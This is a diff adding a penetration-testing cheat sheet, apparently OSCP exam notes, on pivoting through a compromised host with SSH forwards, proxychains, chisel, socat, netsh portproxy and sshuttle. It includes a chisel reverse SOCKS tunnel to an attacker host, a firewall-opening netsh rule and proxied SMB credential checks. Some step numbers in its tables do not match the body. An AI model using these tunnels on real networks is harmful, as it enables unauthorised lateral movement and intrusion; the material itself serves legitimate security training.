@@ -1,0 +1,201 @@
+
+> <b>Purpose:</b> reach a host your Kali cannot route to — by making a host you already control carry the traffic. Pick the smallest tunnel that answers the question, and know which side listens.
+
+## Which tunnel?
+
+| Situation | Use | Listens on |
+| --- | --- | --- |
+| One port on the pivot's [localhost](http://localhost) | <code>ssh -L</code> (Step 01) | Kali |
+| Expose a Kali service to the target network | <code>ssh -R</code> (Step 02) | pivot / target |
+| Many ports, many hosts | SOCKS: <code>ssh -D</code> or chisel (Steps 03-06) | Kali |
+| Whole subnet, no per-tool flags | <code>sshuttle</code> (Step 10) | Kali (needs root) |
+| No SSH, quick single relay | <code>socat</code> (Step 08) | Kali |
+| Windows pivot, no extra binaries | <code>netsh portproxy</code> (Step 09) | Windows pivot |
+
+<b>Two questions before any tunnel:</b> <i>what does the pivot reach that Kali does not?</i> and <i>which direction is the connection allowed?</i> Most failures are a listener bound to <code>127.0.0.1</code> when the client connects from outside.
+
+## A. SSH tunnels
+
+### Step 01 — Local port forward (ssh -L)
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> <USERNAME>@<TARGET_IP>
+# example: reach the pivot's local MySQL on Kali:3306
+ssh -L 3306:127.0.0.1:3306 <USERNAME>@<TARGET_IP>
+```
+
+<b>Look for:</b> a normal SSH session; while it stays open, <code>127.0.0.1:<LOCAL_PORT></code> on Kali reaches <code><REMOTE_PORT></code> <b>as seen from the pivot</b>.<br /><b>Decision:</b> the service is on another internal host → point the middle at that host: <code>ssh -L <LOCAL_PORT>:<INTERNAL_IP>:<REMOTE_PORT> <USERNAME>@<TARGET_IP></code>.<br /><b>Next:</b> connect to <code>127.0.0.1:<LOCAL_PORT></code> on Kali.<br /><b>Common mistake:</b> assuming the forward reaches Kali's network. The right-hand side is resolved <b>from the pivot</b>, not from Kali.<br /><b>Evidence:</b> the SSH session plus a successful connection to the forwarded port.
+
+### Step 02 — Remote port forward (ssh -R)
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+ssh -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> <USERNAME>@<TARGET_IP>
+# example: make Kali's HTTP server reachable on the target network
+ssh -R 8080:127.0.0.1:8000 <USERNAME>@<TARGET_IP>
+```
+
+<b>Look for:</b> traffic to <code><TARGET_IP>:<REMOTE_PORT></code> arriving at Kali's <code>127.0.0.1:<LOCAL_PORT></code>.<br /><b>Decision:</b> internal hosts must reach your payload server → this is the pattern (serve from Kali, forward onto the pivot).<br /><b>Next:</b> start the Kali service first, then open the tunnel.<br /><b>Common mistake:</b> <code>GatewayPorts no</code> (the default) binds the remote listener to <code>127.0.0.1</code> on the pivot — only the pivot itself can use it. Add <code>-R 0.0.0.0:<REMOTE_PORT>:…</code> only if the server allows it.<br /><b>Evidence:</b> a <code>curl</code> from the pivot to <code>127.0.0.1:<REMOTE_PORT></code>.
+
+### Step 03 — Dynamic SOCKS (ssh -D)
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+ssh -D 1080 -N -f <USERNAME>@<TARGET_IP>
+```
+
+<b>Look for:</b> a SOCKS proxy on <code>127.0.0.1:1080</code> that exits at the pivot.<br /><b>Decision:</b> more than one port or host to reach → SOCKS. One port → <code>ssh -L</code> is simpler.<br /><b>Next:</b> Step 04 (proxychains).<br /><b>Common mistake:</b> forgetting <code>-N -f</code>: without them you get an interactive shell and no background proxy.<br /><b>Evidence:</b> <code>ss -tlnp | grep 1080</code> on Kali.
+
+### Step 04 — Proxychains
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
+proxychains4 nmap -Pn -sT -p 445,3389 <INTERNAL_IP>
+proxychains4 nxc smb <INTERNAL_IP> -u <USERNAME> -p <PASSWORD>
+```
+
+<b>Look for:</b> the tool's output arriving through the proxy, and <code>|S-chain|-<>-</code> lines when <code>-q</code> is not set.<br /><b>Decision:</b> DNS fails inside the proxy → enable <code>proxy_dns</code> in the config, or use IP addresses only.<br /><b>Next:</b> run the actual enumeration tool through it.<br /><b>Common mistake:</b> using a SYN scan (<code>-sS</code>) through proxychains. A SOCKS proxy carries <b>TCP connect</b> only — use <code>-sT</code>, and <code>-Pn</code> because ICMP is not proxied.<br /><b>Evidence:</b> the proxychains command and its successful output.
+
+## B. Chisel (no SSH required)
+
+### Step 05 — Start the chisel server
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+chisel server -p <LOCAL_PORT> --reverse --socks5
+```
+
+<b>Look for:</b> <code>server: Listening on https://0.0.0.0:<LOCAL_PORT></code>.<br /><b>Decision:</b> the pivot can reach Kali outbound → this is the most reliable pivot when SSH is closed.<br /><b>Next:</b> Step 06.<br /><b>Common mistake:</b> running the server without <code>--reverse</code> and then trying an <code>R:</code> client connection — reverse tunnels are rejected.<br /><b>Evidence:</b> the server log showing a client connection.
+
+### Step 06 — chisel client (reverse SOCKS)
+
+<b>Priority:</b> Core · <b>Run on:</b> pivot/target · <b>Status:</b> Syntax Checked
+
+```bash
+# upload chisel to the pivot first, then
+chisel client <ATTACKER_IP>:<LOCAL_PORT> R:socks
+```
+
+<b>Look for:</b> <code>client: Connected</code> and a SOCKS proxy on Kali at <code>127.0.0.1:1080</code>.<br /><b>Decision:</b> need a single port instead of SOCKS → <code>chisel client <ATTACKER_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:127.0.0.1:<SERVICE_PORT></code>.<br /><b>Next:</b> point proxychains at 1080 (Step 04).<br /><b>Common mistake:</b> assuming the SOCKS port is configurable on the client in <code>R:socks</code> form — chisel uses 1080 by default; specify <code>R:1081:socks</code> to change it.<br /><b>Evidence:</b> the client log and a proxied request.
+
+## C. Without SSH
+
+### Step 07 — socat relay
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali or pivot · <b>Status:</b> Syntax Checked
+
+```bash
+socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<TARGET_IP>:<REMOTE_PORT>
+# bind to all interfaces so other hosts can use it
+socat TCP-LISTEN:<LOCAL_PORT>,fork,bind=0.0.0.0 TCP:<TARGET_IP>:<REMOTE_PORT>
+```
+
+<b>Look for:</b> connections to <code><LOCAL_PORT></code> being relayed to <code><TARGET_IP>:<REMOTE_PORT></code>.<br /><b>Decision:</b> need many ports → SOCKS. Need one port and no SSH/chisel → socat.<br /><b>Next:</b> connect to the relay.<br /><b>Common mistake:</b> omitting <code>fork</code> — socat then handles exactly one connection and exits.<br /><b>Evidence:</b> a successful connection through the relay.
+
+### Step 08 — Windows portproxy
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Windows pivot · <b>Status:</b> Syntax Checked
+
+```shen
+netsh interface portproxy add v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0 connectport=<REMOTE_PORT> connectaddress=<TARGET_IP>
+netsh interface portproxy show all
+netsh advfirewall firewall add rule name="portproxy" dir=in action=allow protocol=TCP localport=<LOCAL_PORT>
+```
+
+<b>Look for:</b> the rule listed by <code>show all</code>, and the port reachable from Kali.<br /><b>Decision:</b> you have admin on a Windows host that reaches the internal subnet → portproxy, no binaries needed.<br /><b>Next:</b> connect to <code><PIVOT_IP>:<LOCAL_PORT></code>.<br /><b>Common mistake:</b> adding the portproxy but not the firewall rule, then concluding it does not work. Both are required.<br /><b>Evidence:</b> <code>show all</code> output and a successful connection.
+
+### Step 09 — sshuttle
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+```bash
+sshuttle -r <USERNAME>@<TARGET_IP> <TARGET_IP>/24
+# typical: route the internal subnet
+sshuttle -r <USERNAME>@<TARGET_IP> 10.10.10.0/24
+```
+
+<b>Look for:</b> <code>c : Connected to server</code> and direct tool usage with <b>no</b> proxychains prefix.<br /><b>Decision:</b> you have SSH and root on Kali, and want transparent routing for every tool → sshuttle. No root or no SSH → SOCKS.<br /><b>Next:</b> run tools normally against the routed subnet.<br /><b>Common mistake:</b> passing the pivot's own <code>/24</code> instead of the <b>internal</b> subnet you need. Also: sshuttle needs Python on the pivot.<br /><b>Evidence:</b> a successful direct connection to an internal host.
+
+## D. Chains and verification
+
+### Step 10 — Double pivot
+
+<b>Priority:</b> Advanced · <b>Run on:</b> Kali · <b>Status:</b> Documented
+
+```bash
+# SSH jump host, then SOCKS that exits at the second pivot
+ssh -D 1080 -J <USERNAME>@<PIVOT1_IP> <USERNAME>@<PIVOT2_IP>
+# or chain a second chisel hop through the first SOCKS
+```
+
+<b>Look for:</b> <code>127.0.0.1:1080</code> now exiting inside the second network.<br /><b>Decision:</b> each additional hop adds latency and failure points — only add one when the target is genuinely unreachable from the first pivot.<br /><b>Next:</b> re-run Step 04 against the new exit.<br /><b>Common mistake:</b> stacking proxychains on proxychains. One SOCKS entry that already exits deep enough is cleaner than two.<br /><b>Evidence:</b> the hop chain and a request that only succeeds through it.
+
+### Step 11 — Prove the tunnel works
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+proxychains4 -q curl -s -o /dev/null -w "%{http_code}\n" http://<INTERNAL_IP>/
+proxychains4 -q nxc smb <INTERNAL_IP> -u <USERNAME> -p <PASSWORD>
+```
+
+<b>Look for:</b> a real status code or a valid SMB response — not a timeout.<br /><b>Decision:</b> timeout → the pivot cannot reach the target, or the listener is bound to <code>127.0.0.1</code>. Test from the pivot itself first.<br /><b>Next:</b> enumerate the internal host.<br /><b>Evidence:</b> the successful proxied request.
+
+## E. Decision tree
+
+| Situation | Do this | Do <b>not</b> |
+| --- | --- | --- |
+| One service on the pivot | <code>ssh -L</code> (Step 01) | Build a SOCKS proxy |
+| Need Kali reachable from inside | <code>ssh -R</code> (Step 02) | Bind to 127.0.0.1 and expect others to use it |
+| Many ports/hosts | <code>ssh -D</code>  • proxychains (Steps 03-04) | Add a forward per port |
+| SSH closed, outbound allowed | chisel (Steps 05-06) | Give up on pivoting |
+| Windows pivot, admin | netsh portproxy (Step 08) | Upload a Linux binary |
+| Need whole-subnet routing | sshuttle (Step 09) | Prefix every tool manually |
+| One port, no tooling | socat (Step 07) | Write a custom relay |
+| Tunnel "connects" but tools time out | Reachability or bind address | Blame the tool |
+
+## F. Troubleshooting
+
+| Symptom | Cause | Fix |
+| --- | --- | --- |
+| <code>connection refused</code> on the listener | Service bound to 127.0.0.1 | Rebind to 0.0.0.0 or use <code>-L</code> |
+| proxychains: <code>connection timed out</code> | SOCKS not running / wrong port | Check <code>ss -tlnp</code>, fix the config |
+| nmap finds nothing through proxy | SYN scan / ICMP | <code>-sT -Pn</code> |
+| DNS fails through proxy | UDP not proxied | <code>proxy_dns</code>, or use IPs |
+| <code>-R</code> listener only local to pivot | <code>GatewayPorts no</code> | Use chisel or <code>0.0.0.0:</code> if permitted |
+| chisel <code>R:</code> rejected | Server lacks <code>--reverse</code> | Restart with the flag |
+| sshuttle exits immediately | No root / no python on pivot | Run with <code>sudo</code>, or use SOCKS |
+| netsh rule works locally only | Firewall rule missing | Add the inbound rule |
+
+## G. Evidence to preserve
+
+- The tunnel command on both ends (server and client).
+- Proof of reachability from the pivot (<code>curl</code>, <code>nc -vz</code>) <b>and</b> through the tunnel from Kali.
+- The proxy config line you added, and the exact proxied command.
+- Which host is the pivot, and which network it opened.
+
+## H. Related pages
+
+- <mention url="https://app.notion.com/p/4011e51238b58123b446cc627bc02913" /> — authentication and keys
+- <mention url="https://app.notion.com/p/4011e51238b581f6ac9af76979de40a7" /> — moving tools to the pivot
+- Post-Exploitation & Lateral Movement — NetExec and Impacket through tunnels
+- OSCP Attack Workflow — Start Here
+- Exam Checklist — OSCP+
+
+## I. References
+
+- chisel: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+- sshuttle: [https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)
+- proxychains-ng: [https://github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)
+- OpenSSH <code>ssh_config</code>: [https://man.openbsd.org/ssh\_config](https://man.openbsd.org/ssh_config)
+
+## J. Verification note
+
+<code>ssh</code>, <code>chisel</code>, <code>socat</code> and <code>proxychains4</code> are installed here and their flags were checked against local help, so those steps are <b>Syntax Checked</b>. <code>sshuttle</code> and <code>sshpass</code> are not installed, and the double-pivot and Windows <code>netsh</code> steps were not executed against live hosts, so they are <b>Documented</b> or <b>Documented</b>. No step is <b>Lab Tested</b>.
